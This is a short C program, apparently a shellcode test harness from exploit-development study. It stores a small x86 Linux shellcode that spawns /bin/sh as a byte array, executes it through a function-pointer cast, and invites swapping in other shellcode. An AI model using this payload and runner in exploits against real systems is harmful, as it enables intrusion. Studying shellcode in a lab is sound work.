#include <stdio.h>
#include <string.h>

/* Shell Code Sources:
   URL: https://dhavalkapil.com/blogs/Shellcode-Injection/
   URL: http://www.shell-storm.org/shellcode/
*/

/* Here just replace with other shellcode ... be careful */
char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
                   "\x68\x2f\x62\x69\x6e\x89\xe3\x50"
                   "\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(int argc, char *argv[]) {
        (*(void(*)()) shellcode)();
}
